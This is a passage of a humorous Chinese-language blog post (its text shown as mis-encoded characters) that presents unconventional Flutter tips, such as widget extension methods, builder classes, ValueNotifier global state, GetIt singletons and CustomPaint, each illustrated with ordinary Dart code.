li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>"æ­£é“èµ°ä¸é€šçš„æ—¶å€™ï¼Œé‚ªé“ä¹Ÿæ˜¯é“ã€‚"
â€”â€” æŸ Flutter å¼€å‘è€…ï¼Œåœ¨ç¬¬ N æ¬¡è¢«åµŒå¥—åœ°ç‹±é€¼ç–¯åçš„æ„Ÿæ‚Ÿ</p>
</blockquote>
<h2 data-id="heading-0">å‰è¨€ï¼šä¸ºä»€ä¹ˆéœ€è¦"é‚ªä¿®"ï¼Ÿ</h2>
<p>Flutter å®˜æ–¹æ–‡æ¡£å†™å¾—å¾ˆå¥½ï¼Œæ•™ä½ å¦‚ä½•å†™å‡ºä¼˜é›…ã€è§„èŒƒã€å¯ç»´æŠ¤çš„ä»£ç ã€‚</p>
<p>ä½†ç°å®æ˜¯ï¼š</p>
<ul>
<li>äº§å“ç»ç†çš„éœ€æ±‚æ°¸è¿œè¶…å‡ºæ¡†æ¶çš„è®¾è®¡</li>
<li>è®¾è®¡å¸ˆçš„è„‘æ´æ°¸è¿œè¶…å‡º Widget çš„èƒ½åŠ›</li>
<li>è€æ¿çš„ deadline æ°¸è¿œè¶…å‡ºä½ çš„å·¥ä½œæ—¶é—´</li>
</ul>
<p>æ‰€ä»¥ï¼Œå½“æ­£é“èµ°ä¸é€šçš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä¸€äº›..."éå¸¸è§„æ‰‹æ®µ"ã€‚</p>
<p><strong>å…è´£å£°æ˜</strong>ï¼šæœ¬æ–‡ä»‹ç»çš„æŠ€å·§å¯èƒ½ä¼šè®©ä»£ç å®¡æŸ¥è€…è¡€å‹å‡é«˜ï¼Œè¯·è°¨æ…ä½¿ç”¨ã€‚å¦‚å› ä½¿ç”¨æœ¬æ–‡æŠ€å·§å¯¼è‡´è¢«åŒäº‹è¿½æ€ï¼Œæœ¬æ–‡æ¦‚ä¸è´Ÿè´£ã€‚</p>
<hr/>
<h2 data-id="heading-1">ç¬¬ä¸€ç« ï¼šWidget åµŒå¥—åœ°ç‹±çš„é€ƒç”ŸæŒ‡å—</h2>
<h3 data-id="heading-2">1.1 é—®é¢˜ï¼šåµŒå¥—åˆ°æ€€ç–‘äººç”Ÿ</h3>
<p>æ¯ä¸ª Flutter å¼€å‘è€…éƒ½ç»å†è¿‡è¿™æ ·çš„æ—¶åˆ»ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// æ­£å¸¸äººå†™çš„ä»£ç </span>
Scaffold(
  body: SafeArea(
    child: Padding(
      padding: EdgeInsets.all(<span class="hljs-number">16</span>),
      child: Column(
        children: [
          Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(<span class="hljs-number">8</span>),
              color: Colors.white,
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(<span class="hljs-number">0.1</span>),
                  blurRadius: <span class="hljs-number">10</span>,
                  offset: Offset(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>),
                ),
              ],
            ),
            child: Padding(
              padding: EdgeInsets.all(<span class="hljs-number">16</span>),
              child: Row(
                children: [
                  <span class="hljs-comment">// è¿˜è¦ç»§ç»­åµŒå¥—...</span>
                  <span class="hljs-comment">// æˆ‘å·²ç»æ•°ä¸æ¸…è¿™æ˜¯ç¬¬å‡ å±‚äº†...</span>
                  <span class="hljs-comment">// æ•‘å‘½...</span>
                ],
              ),
            ),
          ),
        ],
      ),
    ),
  ),
)
</code></pre>
<p><strong>åµŒå¥—å±‚æ•°ï¼šå·²è¶…å‡ºäººç±»ç†è§£èŒƒå›´</strong></p>
<h3 data-id="heading-3">1.2 é‚ªä¿®æŠ€å·§ï¼šExtension å¤§æ³•</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// é‚ªä¿®ç§˜ç±ç¬¬ä¸€å¼ï¼šExtension é“¾å¼è°ƒç”¨</span>

<span class="hljs-keyword">extension</span> WidgetExtensions <span class="hljs-keyword">on</span> Widget {
  <span class="hljs-comment">// å¿«é€Ÿæ·»åŠ  Padding</span>
  Widget padAll(<span class="hljs-built_in">double</span> value) =&gt; Padding(
    padding: EdgeInsets.all(value),
    child: <span class="hljs-keyword">this</span>,
  );

  Widget padH(<span class="hljs-built_in">double</span> value) =&gt; Padding(
    padding: EdgeInsets.symmetric(horizontal: value),
    child: <span class="hljs-keyword">this</span>,
  );

  Widget padV(<span class="hljs-built_in">double</span> value) =&gt; Padding(
    padding: EdgeInsets.symmetric(vertical: value),
    child: <span class="hljs-keyword">this</span>,
  );

  <span class="hljs-comment">// å¿«é€Ÿå±…ä¸­</span>
  Widget <span class="hljs-keyword">get</span> centered =&gt; Center(child: <span class="hljs-keyword">this</span>);

  <span class="hljs-comment">// å¿«é€Ÿæ·»åŠ ç‚¹å‡»äº‹ä»¶</span>
  Widget onTap(VoidCallback? onTap) =&gt; GestureDetector(
    onTap: onTap,
    behavior: HitTestBehavior.opaque,
    child: <span class="hljs-keyword">this</span>,
  );

  <span class="hljs-comment">// å¿«é€Ÿæ·»åŠ åœ†è§’èƒŒæ™¯</span>
  Widget withRoundedBg({
    Color color = Colors.white,
    <span class="hljs-built_in">double</span> radius = <span class="hljs-number">8</span>,
    <span class="hljs-built_in">List</span>&lt;BoxShadow&gt;? shadows,
  }) =&gt; Container(
    decoration: BoxDecoration(
      color: color,
      borderRadius: BorderRadius.circular(radius),
      boxShadow: shadows,
    ),
    child: <span class="hljs-keyword">this</span>,
  );

  <span class="hljs-comment">// å¿«é€Ÿ Expanded</span>
  Widget <span class="hljs-keyword">get</span> expanded =&gt; Expanded(child: <span class="hljs-keyword">this</span>);

  <span class="hljs-comment">// å¿«é€Ÿ SizedBox</span>
  Widget sized({<span class="hljs-built_in">double?</span> width, <span class="hljs-built_in">double?</span> height}) =&gt; SizedBox(
    width: width,
    height: height,
    child: <span class="hljs-keyword">this</span>,
  );

  <span class="hljs-comment">// å¿«é€Ÿæ·»åŠ é€æ˜åº¦</span>
  Widget opacity(<span class="hljs-built_in">double</span> value) =&gt; Opacity(
    opacity: value,
    child: <span class="hljs-keyword">this</span>,
  );

  <span class="hljs-comment">// æ¡ä»¶æ˜¾ç¤º</span>
  Widget visible(<span class="hljs-built_in">bool</span> isVisible) =&gt; isVisible ? <span class="hljs-keyword">this</span> : SizedBox.shrink();
}

<span class="hljs-comment">// ä½¿ç”¨åçš„ä»£ç ï¼šæ¸…çˆ½ï¼</span>
Text(<span class="hljs-string">'Hello Flutter'</span>)
    .padAll(<span class="hljs-number">16</span>)
    .withRoundedBg(color: Colors.blue.shade50, radius: <span class="hljs-number">12</span>)
    .padH(<span class="hljs-number">20</span>)
    .onTap(() =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'ç‚¹æˆ‘å¹²å˜›'</span>))
</code></pre>
<p><strong>ä»£ç å®¡æŸ¥è€…</strong>ï¼šè¿™ä»€ä¹ˆé¬¼ï¼Ÿ
<strong>ä½ </strong>ï¼šè¿™å«"å£°æ˜å¼ UI çš„å‡½æ•°å¼å¢å¼º"ï¼Œæ‡‚ä¸æ‡‚ï¼Ÿ</p>
<h3 data-id="heading-4">1.3 è¿›é˜¶é‚ªä¿®ï¼šBuilder æ¨¡å¼</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// é‚ªä¿®ç§˜ç±ç¬¬äºŒå¼ï¼šè‡ªå®šä¹‰ Builder</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CardBuilder</span> </span>{
  Widget? _child;
  EdgeInsets _padding = EdgeInsets.all(<span class="hljs-number">16</span>);
  Color _backgroundColor = Colors.white;
  <span class="hljs-built_in">double</span> _borderRadius = <span class="hljs-number">8</span>;
  <span class="hljs-built_in">List</span>&lt;BoxShadow&gt;? _shadows;
  VoidCallback? _onTap;

  CardBuilder child(Widget child) {
    _child = child;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
  }

  CardBuilder padding(EdgeInsets padding) {
    _padding = padding;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
  }

  CardBuilder backgroundColor(Color color) {
    _backgroundColor = color;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
  }

  CardBuilder borderRadius(<span class="hljs-built_in">double</span> radius) {
    _borderRadius = radius;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
  }

  CardBuilder withShadow() {
    _shadows = [
      BoxShadow(
        color: Colors.black.withOpacity(<span class="hljs-number">0.1</span>),
        blurRadius: <span class="hljs-number">10</span>,
        offset: Offset(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>),
      ),
    ];
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
  }

  CardBuilder onTap(VoidCallback callback) {
    _onTap = callback;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
  }

  Widget build() {
    Widget result = Container(
      padding: _padding,
      decoration: BoxDecoration(
        color: _backgroundColor,
        borderRadius: BorderRadius.circular(_borderRadius),
        boxShadow: _shadows,
      ),
      child: _child,
    );

    <span class="hljs-keyword">if</span> (_onTap != <span class="hljs-keyword">null</span>) {
      result = GestureDetector(
        onTap: _onTap,
        child: result,
      );
    }

    <span class="hljs-keyword">return</span> result;
  }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
CardBuilder()
    .child(Text(<span class="hljs-string">'ä¼˜é›…ï¼'</span>))
    .padding(EdgeInsets.all(<span class="hljs-number">20</span>))
    .backgroundColor(Colors.blue.shade50)
    .borderRadius(<span class="hljs-number">16</span>)
    .withShadow()
    .onTap(() =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'çœŸçš„å¾ˆä¼˜é›…'</span>))
    .build()
</code></pre>
<hr/>
<h2 data-id="heading-5">ç¬¬äºŒç« ï¼šçŠ¶æ€ç®¡ç†çš„é‡è·¯å­</h2>
<h3 data-id="heading-6">2.1 é—®é¢˜ï¼šProvider/Bloc/Riverpod é€‰æ‹©å›°éš¾ç—‡</h3>
<p>Flutter çš„çŠ¶æ€ç®¡ç†æ–¹æ¡ˆæ¯”å¥³æœ‹å‹çš„å¿ƒæ€è¿˜éš¾çŒœï¼š</p>
<ul>
<li>Providerï¼šç®€å•ä½†ä¸å¤Ÿå¼ºå¤§</li>
<li>Blocï¼šå¼ºå¤§ä½†å¤ªå•°å—¦</li>
<li>Riverpodï¼šç°ä»£ä½†å­¦ä¹ æ›²çº¿é™¡</li>
<li>GetXï¼šç®€å•ä½†è¢«é„™è§†é“¾åº•ç«¯</li>
</ul>
<h3 data-id="heading-7">2.2 é‚ªä¿®æŠ€å·§ï¼šValueNotifier ä¸€æŠŠæ¢­</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// é‚ªä¿®ç§˜ç±ç¬¬ä¸‰å¼ï¼šValueNotifier æç®€çŠ¶æ€ç®¡ç†</span>

<span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå…¨å±€çŠ¶æ€å®¹å™¨</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppState</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> counter = ValueNotifier&lt;<span class="hljs-built_in">int</span>&gt;(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> user = ValueNotifier&lt;User?&gt;(<span class="hljs-keyword">null</span>);
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> theme = ValueNotifier&lt;ThemeMode&gt;(ThemeMode.light);
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> isLoading = ValueNotifier&lt;<span class="hljs-built_in">bool</span>&gt;(<span class="hljs-keyword">false</span>);

  <span class="hljs-comment">// å¤æ‚çŠ¶æ€ç”¨ Map</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> formData = ValueNotifier&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt;({});

  <span class="hljs-comment">// é‡ç½®æ‰€æœ‰çŠ¶æ€</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> reset() {
    counter.value = <span class="hljs-number">0</span>;
    user.value = <span class="hljs-keyword">null</span>;
    theme.value = ThemeMode.light;
    isLoading.value = <span class="hljs-keyword">false</span>;
    formData.value = {};
  }
}

<span class="hljs-comment">// ä½¿ç”¨ï¼šç®€å•ç²—æš´</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CounterPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      body: Center(
        child: ValueListenableBuilder&lt;<span class="hljs-built_in">int</span>&gt;(
          valueListenable: AppState.counter,
          builder: (context, count, child) {
            <span class="hljs-keyword">return</span> Text(<span class="hljs-string">'Count: <span class="hljs-subst">$count</span>'</span>);
          },
        ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: () =&gt; AppState.counter.value++,
        child: Icon(Icons.add),
      ),
    );
  }
}

<span class="hljs-comment">// å†å°è£…ä¸€ä¸‹ï¼Œæ›´ç®€æ´</span>
<span class="hljs-keyword">extension</span> ValueNotifierExtension&lt;T&gt; <span class="hljs-keyword">on</span> ValueNotifier&lt;T&gt; {
  Widget watch(Widget <span class="hljs-built_in">Function</span>(T value) builder) {
    <span class="hljs-keyword">return</span> ValueListenableBuilder&lt;T&gt;(
      valueListenable: <span class="hljs-keyword">this</span>,
      builder: (_, value, __) =&gt; builder(value),
    );
  }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
AppState.counter.watch((count) =&gt; Text(<span class="hljs-string">'Count: <span class="hljs-subst">$count</span>'</span>))
</code></pre>
<p><strong>æ­£ç»äºº</strong>ï¼šè¿™ä¸å°±æ˜¯å…¨å±€å˜é‡å—ï¼Ÿ
<strong>ä½ </strong>ï¼šè¿™å«"è½»é‡çº§å“åº”å¼çŠ¶æ€ç®¡ç†"ï¼Œè°¢è°¢ã€‚</p>
<h3 data-id="heading-8">2.3 æ›´é‚ªçš„æŠ€å·§ï¼šGetIt + å•ä¾‹</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// é‚ªä¿®ç§˜ç±ç¬¬å››å¼ï¼šæœåŠ¡å®šä½å™¨æ¨¡å¼</span>

<span class="hljs-comment">// å®šä¹‰æœåŠ¡</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AuthService</span> </span>{
  <span class="hljs-keyword">final</span> _user = ValueNotifier&lt;User?&gt;(<span class="hljs-keyword">null</span>);
  ValueListenable&lt;User?&gt; <span class="hljs-keyword">get</span> user =&gt; _user;

  <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isLoggedIn =&gt; _user.value != <span class="hljs-keyword">null</span>;

  Future&lt;<span class="hljs-keyword">void</span>&gt; login(<span class="hljs-built_in">String</span> email, <span class="hljs-built_in">String</span> password) <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// ç™»å½•é€»è¾‘</span>
    _user.value = User(email: email);
  }

  <span class="hljs-keyword">void</span> logout() {
    _user.value = <span class="hljs-keyword">null</span>;
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiService</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> baseUrl;
  ApiService({<span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.baseUrl});

  Future&lt;<span class="hljs-built_in">dynamic</span>&gt; <span class="hljs-keyword">get</span>(<span class="hljs-built_in">String</span> path) <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// API è°ƒç”¨</span>
  }
}

<span class="hljs-comment">// æ³¨å†ŒæœåŠ¡</span>
<span class="hljs-keyword">void</span> setupServices() {
  GetIt.I.registerSingleton&lt;AuthService&gt;(AuthService());
  GetIt.I.registerSingleton&lt;ApiService&gt;(
    ApiService(baseUrl: <span class="hljs-string">'https://api.example.com'</span>),
  );
}

<span class="hljs-comment">// ä½¿ç”¨ï¼šéšå¤„å¯ç”¨</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SomePage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-comment">// ç›´æ¥è·å–æœåŠ¡</span>
  <span class="hljs-keyword">final</span> auth = GetIt.I&lt;AuthService&gt;();
  <span class="hljs-keyword">final</span> api = GetIt.I&lt;ApiService&gt;();

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> auth.user.watch((user) {
      <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> LoginPage();
      <span class="hljs-keyword">return</span> HomePage(user: user);
    });
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-9">ç¬¬ä¸‰ç« ï¼šæ€§èƒ½ä¼˜åŒ–çš„é»‘é­”æ³•</h2>
<h3 data-id="heading-10">3.1 é—®é¢˜ï¼šåˆ—è¡¨å¡æˆ PPT</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// å¸¸è§çš„æ€§èƒ½æ€æ‰‹</span>
ListView.builder(
  itemCount: <span class="hljs-number">1000</span>,
  itemBuilder: (context, index) {
    <span class="hljs-comment">// æ¯æ¬¡éƒ½åˆ›å»ºæ–°çš„ Widget</span>
    <span class="hljs-keyword">return</span> Card(
      child: ListTile(
        leading: CircleAvatar(
          backgroundImage: NetworkImage(items[index].avatar), <span class="hljs-comment">// æ¯æ¬¡éƒ½åŠ è½½</span>
        ),
        title: Text(items[index].title),
        subtitle: Text(items[index].subtitle),
      ),
    );
  },
)
</code></pre>
<h3 data-id="heading-11">3.2 é‚ªä¿®æŠ€å·§ï¼šconst å¤§æ³• + ç¼“å­˜</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// é‚ªä¿®ç§˜ç±ç¬¬äº”å¼ï¼šèƒ½ const å°± const</span>

<span class="hljs-comment">// 1. æå–é™æ€éƒ¨åˆ†ä¸º const</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OptimizedListItem</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> Item item;
  <span class="hljs-keyword">const</span> OptimizedListItem({<span class="hljs-keyword">super</span>.key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.item});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Card(
      child: ListTile(
        <span class="hljs-comment">// ä½¿ç”¨ç¼“å­˜çš„å›¾ç‰‡</span>
        leading: CachedNetworkImage(
          imageUrl: item.avatar,
          placeholder: <span class="hljs-keyword">const</span> CircleAvatar(child: Icon(Icons.person)),
        ),
        title: Text(item.title),
        subtitle: Text(item.subtitle),
        <span class="hljs-comment">// é™æ€éƒ¨åˆ†ç”¨ const</span>
        trailing: <span class="hljs-keyword">const</span> Icon(Icons.chevron_right),
      ),
    );
  }
}

<span class="hljs-comment">// 2. ä½¿ç”¨ itemExtent å›ºå®šé«˜åº¦</span>
ListView.builder(
  itemCount: <span class="hljs-number">1000</span>,
  itemExtent: <span class="hljs-number">72</span>, <span class="hljs-comment">// å›ºå®šé«˜åº¦ï¼Œæ€§èƒ½èµ·é£</span>
  itemBuilder: (context, index) {
    <span class="hljs-keyword">return</span> OptimizedListItem(item: items[index]);
  },
)

<span class="hljs-comment">// 3. å›¾ç‰‡ç¼“å­˜å°è£…</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CachedNetworkImage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> imageUrl;
  <span class="hljs-keyword">final</span> Widget placeholder;

  <span class="hljs-keyword">const</span> CachedNetworkImage({
    <span class="hljs-keyword">super</span>.key,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.imageUrl,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.placeholder,
  });

  <span class="hljs-comment">// ç®€å•çš„å†…å­˜ç¼“å­˜</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> _cache = &lt;<span class="hljs-built_in">String</span>, ImageProvider&gt;{};

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">final</span> provider = _cache.putIfAbsent(
      imageUrl,
      () =&gt; NetworkImage(imageUrl),
    );

    <span class="hljs-keyword">return</span> CircleAvatar(
      backgroundImage: provider,
      onBackgroundImageError: (_, __) {},
      child: placeholder,
    );
  }
}
</code></pre>
<h3 data-id="heading-12">3.3 RepaintBoundaryï¼šå±€éƒ¨åˆ·æ–°ç¥å™¨</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// é‚ªä¿®ç§˜ç±ç¬¬å…­å¼ï¼šéš”ç¦»é‡ç»˜åŒºåŸŸ</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnimatedCounter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _AnimatedCounterState createState() =&gt; _AnimatedCounterState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_AnimatedCounterState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">AnimatedCounter</span>&gt; </span>{
  <span class="hljs-built_in">int</span> _count = <span class="hljs-number">0</span>;

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Column(
      children: [
        <span class="hljs-comment">// è¿™éƒ¨åˆ†ä¸éœ€è¦é‡ç»˜</span>
        <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'è¿™æ˜¯ä¸€ä¸ªè®¡æ•°å™¨'</span>),
        <span class="hljs-keyword">const</span> SizedBox(height: <span class="hljs-number">20</span>),

        <span class="hljs-comment">// åªæœ‰è¿™éƒ¨åˆ†éœ€è¦é‡ç»˜ï¼Œç”¨ RepaintBoundary éš”ç¦»</span>
        RepaintBoundary(
          child: Text(
            <span class="hljs-string">'<span class="hljs-subst">$_count</span>'</span>,
            style: TextStyle(fontSize: <span class="hljs-number">48</span>),
          ),
        ),

        <span class="hljs-keyword">const</span> SizedBox(height: <span class="hljs-number">20</span>),
        <span class="hljs-comment">// æŒ‰é’®ä¹Ÿä¸éœ€è¦é‡ç»˜</span>
        ElevatedButton(
          onPressed: () =&gt; setState(() =&gt; _count++),
          child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'å¢åŠ '</span>),
        ),
      ],
    );
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-13">ç¬¬å››ç« ï¼šUI å®ç°çš„å¥‡æŠ€æ·«å·§</h2>
<h3 data-id="heading-14">4.1 é—®é¢˜ï¼šè®¾è®¡å¸ˆçš„"ç®€å•éœ€æ±‚"</h3>
<p>è®¾è®¡å¸ˆï¼šè¿™ä¸ªæ•ˆæœå¾ˆç®€å•çš„ï¼Œå°±æ˜¯ä¸€ä¸ªæ¸å˜ + æ¨¡ç³Š + é˜´å½± + åŠ¨ç”»...</p>
<p>ä½ ï¼š...</p>
<h3 data-id="heading-15">4.2 é‚ªä¿®æŠ€å·§ï¼šCustomPaint ä¸‡èƒ½è§£</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// é‚ªä¿®ç§˜ç±ç¬¬ä¸ƒå¼ï¼šCustomPaint ç”»ä¸€åˆ‡</span>

<span class="hljs-comment">// ç”»ä¸€ä¸ªç‚«é…·çš„è¿›åº¦æ¡</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FancyProgressBar</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">double</span> progress;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;Color&gt; gradientColors;

  <span class="hljs-keyword">const</span> FancyProgressBar({
    <span class="hljs-keyword">super</span>.key,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.progress,
    <span class="hljs-keyword">this</span>.gradientColors = <span class="hljs-keyword">const</span> [Colors.blue, Colors.purple],
  });

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> CustomPaint(
      size: Size(<span class="hljs-built_in">double</span>.infinity, <span class="hljs-number">20</span>),
      painter: _FancyProgressPainter(
        progress: progress,
        colors: gradientColors,
      ),
    );
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_FancyProgressPainter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">CustomPainter</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">double</span> progress;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;Color&gt; colors;

  _FancyProgressPainter({<span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.progress, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.colors});

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> paint(Canvas canvas, Size size) {
    <span class="hljs-keyword">final</span> rect = Rect.fromLTWH(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, size.width, size.height);
    <span class="hljs-keyword">final</span> rrect = RRect.fromRectAndRadius(rect, Radius.circular(<span class="hljs-number">10</span>));

    <span class="hljs-comment">// èƒŒæ™¯</span>
    <span class="hljs-keyword">final</span> bgPaint = Paint()..color = Colors.grey.shade200;
    canvas.drawRRect(rrect, bgPaint);

    <span class="hljs-comment">// è¿›åº¦æ¡</span>
